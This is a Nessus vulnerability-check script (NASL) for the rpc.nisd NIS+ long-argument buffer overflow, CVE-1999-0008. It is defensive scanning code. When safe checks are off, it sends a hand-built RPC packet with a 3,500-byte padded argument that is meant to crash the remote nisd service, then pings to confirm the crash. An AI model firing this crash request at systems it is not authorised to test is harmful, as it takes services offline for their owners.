#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
	script_id(10251);
	script_version ("$Revision: 1.13 $");
	script_cve_id("CVE-1999-0008");
	script_bugtraq_id(104);
	script_xref(name:"OSVDB", value:"11724");

	script_name(english:"Multiple Vendor rpc.nisd Long NIS+ Argument Remote Overflow");
  script_summary(english:"Buffer overflow through rpc.nisd");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote RPC service 100300 (nisd) is vulnerable to a buffer overflow which
allows any user to obtain a root shell on this host."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Disable this service if you don't use it, or apply the relevant patch."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://sunsolve.sun.com/search/document.do?assetkey=1-22-00170-1'
  );

	  script_set_attribute(
    attribute:'see_also',
    value:'http://www.cert.org/advisories/CA-98.06.nisd.html'
	);

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P'
  );

  script_end_attributes();

	script_category(ACT_MIXED_ATTACK); # mixed
	script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
	script_family(english:"RPC");
	if ( !defined_func("bn_random") )
	 script_dependencies("rpc_portmap.nasl");
	else
	 script_dependencies("rpc_portmap.nasl", "solaris26_105401.nasl", "solaris26_x86_105402.nasl");
	script_require_keys("rpc/portmap");

	exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

if (report_paranoia < 2) exit(0);

version = get_kb_item("Host/Solaris/Version");
if ( version && ereg(pattern:"^5\.([7-9]|10)", string:version)) exit(0);
if ( get_kb_item("BID-102") ) exit(0);

function ping(port)
{
 local_var r, req, soc;

 req =  raw_string(0x3A, 0x90, 0x9C, 0x2F, 0x00, 0x00,
    	0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
	0x87, 0xCC, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x04) + crap(4);
  soc = open_sock_udp(port);
  if(!soc)exit(0);
  send(socket:soc, data:req);
  r = recv(socket:soc, length:512);
  if(r) return 1;
  else return 0;
}

port = get_rpc_port(program:100300, protocol:IPPROTO_UDP);
if(port)
{
  if(safe_checks())
  {
  data = "
The remote RPC service 100300 (nisd) *may* be vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.

*** Nessus did not actually check for this flaw, so this
*** might be a false positive

Solution : disable this service if you don't useit, or apply
the relevant patch
Risk factor : High";
  security_hole(port:port, data:data);
  exit(0);
  }


  if(get_udp_port_state(port))
  {
   if(ping(port:port))
   {
   soc = open_sock_udp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    req = raw_string(0x3A, 0x90, 0x9C, 0x2F, 0x00, 0x00,
    	0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01,
	0x87, 0xCC, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
	0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x09, 0x2C) + crap(3500);


     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     close(soc);

     if(!ping(port:port))security_hole(port);
   }
   }
 }
}
